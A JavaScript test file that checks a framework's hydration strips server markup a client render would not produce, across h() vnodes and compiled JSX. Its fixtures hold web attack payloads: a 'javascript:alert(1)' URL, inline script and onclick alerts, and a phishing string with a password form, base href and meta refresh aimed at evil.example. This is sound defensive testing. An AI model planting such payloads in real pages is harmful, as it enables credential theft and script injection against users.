// The trust baseline of hydration (SECURITY.md, "Hydration"): after hydrate()
// the page holds exactly what a client render of the same tree with the same
// data holds. No element, attribute, URL, handler, shadow root, script, style
// or raw HTML of the server's outlives the walk unless the client renders it
// too. Each case hands both clients (h() vnodes and compiled JSX built for
// hydration) server markup carrying something the client would not write, and
// compares the hydrated container with a fresh client render.

import { describe, it, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { installDOM } from '../../../test-utils/dom.js';
import { loadCompiled } from '../../../test-utils/load-compiled.js';

installDOM();

const { h, mount, hydrate, flushSync, signal } = await import('../src/index.js');
const { clearDiagnostics } = await import('../src/diagnostics.js');

const quiet = (fn) => {
  const { warn, error } = console;
  const warnings = [];
  console.warn = (...args) => warnings.push(args.join(' '));
  console.error = () => {};
  try { return [fn(), warnings]; } finally { console.warn = warn; console.error = error; }
};

function serialize(node) {
  if (node.nodeType === 3) return node.data;
  if (node.nodeType !== 1) return '';
  const attrs = [...node.attributes].map((a) => ` ${a.name}="${a.value}"`).sort().join('');
  let inner = '';
  for (const child of node.childNodes) inner += serialize(child);
  const shadow = node.shadowRoot ? '#shadow' : '';
  return `<${node.localName}${attrs}${shadow}>${inner}</${node.localName}>`;
}

// `prepare(host)` runs after the server's markup is parsed, before hydrate().
function check(serverHTML, tree, prepare) {
  const host = document.body.appendChild(document.createElement('div'));
  host.innerHTML = serverHTML;
  if (prepare) prepare(host);
  const reports = [];
  const [stop, warnings] = quiet(() => hydrate(tree(), host, { onHydrationError: (info) => reports.push(info) }));
  flushSync();
  const fresh = document.createElement('div');
  const [unmount] = quiet(() => mount(tree(), fresh));
  flushSync();
  const result = { hydrated: serialize(host).replace(/^<div>|<\/div>$/g, ''), fresh: serialize(fresh).replace(/^<div>|<\/div>$/g, ''), kinds: reports.map((r) => r.kind), reports, warnings, host };
  unmount();
  stop();
  host.remove();
  return result;
}

const evil = 'javascript:alert(1)';
const phish = '<form action="https://evil.example/"><input name="password"></form><base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example/">';

beforeEach(() => clearDiagnostics());

describe('h() client: an attribute survives only where a prop renders exactly that value', () => {
  const cases = [
    ['a reactive URL the client refuses', `<a href="${evil}">x</a>`, () => h('a', { href: () => evil }, 'x')],
    ['a URL object the client refuses', `<a href="${evil}">x</a>`, () => h('a', { href: new URL(evil) }, 'x')],
    ['a reactive srcdoc', '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>', () => h('iframe', { srcdoc: () => '<b>x</b>' })],
    ['a reactive formAction', `<button formaction="${evil}">go</button>`, () => h('button', { formAction: () => evil }, 'go')],
    ['a style object', '<div style="color: red; position: fixed; background-image: url(https://evil.example/t.gif);">x</div>', () => h('div', { style: { color: 'red' } }, 'x')],
    ['a boolean property given a string', '<button disabled="">go</button>', () => h('button', { disabled: '' }, 'go')],
    ['a value attribute', '<input value="server">', () => h('input', { value: 'client' })],
    ['an event handler prop', '<button onclick="alert(1)">go</button>', () => h('button', { onclick: () => {} }, 'go')],
    ['a reactive class', '<p class="server" data-x="1">x</p>', () => h('p', { class: () => 'client' }, 'x')],
  ];
  for (const [label, html, tree] of cases) {
    it(label, () => {
      const result = check(html, tree);
      assert.equal(result.hydrated, result.fresh);
      assert.deepEqual(result.kinds, [], 'attribute differences are corrected, not reported');
    });
  }

  it('a plain string the server wrote exactly is kept as it is', () => {
    const host = document.body.appendChild(document.createElement('div'));
    host.innerHTML = '<a href="/home" title="t">x</a>';
    const a = host.firstChild;
    const attr = a.getAttributeNode('href');
    const stop = hydrate(h('a', { href: '/home', title: 't' }, 'x'), host);
    assert.equal(a.getAttributeNode('href'), attr, 'not written again');
    stop();
    host.remove();
  });

  it('the setter that refuses a URL removes what an earlier write set, and the warning says what happened', () => {
    const url = signal('/safe');
    const host = document.body.appendChild(document.createElement('div'));
    const [stop] = quiet(() => mount(h('a', { href: () => url() }, 'x'), host));
    assert.equal(host.querySelector('a').getAttribute('href'), '/safe');
    const [, warnings] = quiet(() => { url(evil); flushSync(); });
    assert.equal(host.querySelector('a').hasAttribute('href'), false);
    assert.match(warnings.join('\n'), /Blocked unsafe URL in "href"/);
    stop();
    host.remove();
  });
});

describe('h() client: an element the client leaves empty', () => {
  it('loses what the server put in it, and reports it', () => {
    const result = check(`<main><div class="spacer">${phish}</div></main>`, () => h('main', null, h('div', { class: 'spacer' })));
    assert.equal(result.hydrated, result.fresh);
    assert.deepEqual(result.kinds, ['extra-nodes']);
    assert.equal(result.reports[0].path, 'main>div>form');
  });

  it('with a reactive class: the same', () => {
    const result = check(`<section><div class="icon">${phish}</div>text</section>`, () => h('section', null, h('div', { class: () => 'icon' }), 'text'));
    assert.equal(result.hydrated, result.fresh);
    assert.deepEqual(result.kinds, ['extra-nodes']);
  });

  it('keeps raw HTML a prop writes again when it matches, and replaces it otherwise', () => {
    const same = check('<div><b>raw</b></div>', () => h('div', { innerHTML: { __html: '<b>raw</b>' } }));
    assert.equal(same.hydrated, same.fresh);
    assert.deepEqual(same.kinds, []);
    const other = check(`<div>${phish}</div>`, () => h('div', { innerHTML: { __html: '<b>raw</b>' } }));
    assert.equal(other.hydrated, other.fresh);
  });

  it('keeps an island host\'s markup, which the island hydrates', () => {
    const host = document.body.appendChild(document.createElement('div'));
    host.innerHTML = '<div data-island="Panel"><p>server</p></div>';
    const p = host.querySelector('p');
    const reports = [];
    const stop = hydrate(h('div', { 'data-island': 'Panel' }), host, { onHydrationError: (r) => reports.push(r) });
    assert.equal(host.querySelector('p'), p);
    assert.deepEqual(reports, []);
    stop();
    host.remove();
  });

  it('a data-island attribute only the server wrote keeps nothing', () => {
    const result = check(`<div data-island="Panel">${phish}</div>`, () => h('div', null));
    assert.equal(result.hydrated, result.fresh);
  });
});

describe('h() client: shadow roots, scripts and templates', () => {
  it('a claimed element hosting a shadow root is replaced, and reported', () => {
    const result = check('<main><div class="card"><p>Balance: 10</p></div></main>',
      () => h('main', null, h('div', { class: 'card' }, h('p', null, 'Balance: 10'))),
      (host) => { host.querySelector('.card').attachShadow({ mode: 'open' }).innerHTML = phish; });
    assert.equal(result.hydrated, result.fresh);
    assert.deepEqual(result.kinds, ['shadow-root']);
    assert.equal(result.reports[0].path, 'main>div');
  });

  it('a script or template inside a claimed element is left over', () => {
    const result = check('<ul><li>a</li><template id="t1"><b>x</b></template><script>1</script></ul>', () => h('ul', null, h('li', null, 'a')));
    assert.equal(result.hydrated, result.fresh);
    assert.deepEqual(result.kinds, ['extra-nodes']);
  });

  it('only the stream\'s own elements at the container\'s top level are not', () => {
    const stream = '<script type="application/json" data-what-data="">{}</script><template id="B1"><b>late</b></template><script>_$W.s("B1")</script>';
    const host = document.body.appendChild(document.createElement('div'));
    host.innerHTML = `<p>page</p>${stream}<script>alert(1)</script><template><i>x</i></template>`;
    const reports = [];
    const stop = hydrate(h('p', null, 'page'), host, { onHydrationError: (r) => reports.push(r.kind) });
    assert.deepEqual(reports, ['extra-nodes']);
    assert.equal(host.innerHTML, `<p>page</p>${stream}`);
    stop();
    host.remove();
  });
});

const compiled = await loadCompiled(`
  export const Spacer = () => <main><div class="spacer"></div></main>;
  export const Icon = (p) => <section><div class={p.cls()}></div>text</section>;
  export const Root = () => <div class="empty-root"></div>;
  export const Raw = (p) => <div innerHTML={{ __html: p.html }}></div>;
  export const Card = () => <main><div class="card"><p>Balance: 10</p></div></main>;
  export const Deep = () => <main><section><div class="card"><p>Balance: 10</p></div></section></main>;
  export const List = () => <ul><li>a</li></ul>;
  export const Link = (p) => <nav><a href={p.href()}>x</a><span style={p.style()}>y</span></nav>;
`, { pluginOptions: { hydratable: true } });

describe('compiled client: the same baseline', () => {
  it('a static element the template leaves empty loses what the server put in it', () => {
    const result = check(`<main><div class="spacer">${phish}</div></main>`, () => h(compiled.Spacer));
    assert.equal(result.hydrated, result.fresh);
    assert.deepEqual(result.kinds, ['extra-nodes']);
  });

  it('so does one with an attribute binding, and an empty template root', () => {
    for (const [html, tree] of [
      [`<section><div class="icon">${phish}</div>text</section>`, () => h(compiled.Icon, { cls: () => 'icon' })],
      [`<div class="empty-root">${phish}</div>`, () => h(compiled.Root)],
    ]) {
      const result = check(html, tree);
      assert.equal(result.hydrated, result.fresh);
      assert.deepEqual(result.kinds, ['extra-nodes']);
    }
  });

  it('an innerHTML target keeps the server\'s content and the binding writes its own', () => {
    const result = check(`<div>${phish}</div>`, () => h(compiled.Raw, { html: '<b>raw</b>' }));
    assert.equal(result.hydrated, result.fresh);
    assert.deepEqual(result.kinds, []);
  });

  it('a shadow root on a claimed element, or inside a static subtree adopted whole, is replaced and reported', () => {
    for (const [tree, selector] of [[compiled.Card, '.card'], [compiled.Deep, '.card']]) {
      const result = check(tree === compiled.Card ? '<main><div class="card"><p>Balance: 10</p></div></main>' : '<main><section><div class="card"><p>Balance: 10</p></div></section></main>',
        () => h(tree), (host) => { host.querySelector(selector).attachShadow({ mode: 'open' }).innerHTML = phish; });
      assert.equal(result.hydrated, result.fresh);
      assert.deepEqual(result.kinds, ['shadow-root']);
    }
  });

  it('a template or script inside a claimed element is left over', () => {
    const result = check('<ul><li>a</li><template id="t1"><b>x</b></template></ul>', () => h(compiled.List));
    assert.equal(result.hydrated, result.fresh);
    assert.deepEqual(result.kinds, ['extra-nodes']);
  });

  it('a refused reactive href and extra style declarations do not survive', () => {
    const result = check(`<nav><a href="${evil}">x</a><span style="color: red; position: fixed;">y</span></nav>`,
      () => h(compiled.Link, { href: () => evil, style: () => ({ color: 'red' }) }));
    assert.equal(result.hydrated, result.fresh);
  });
});
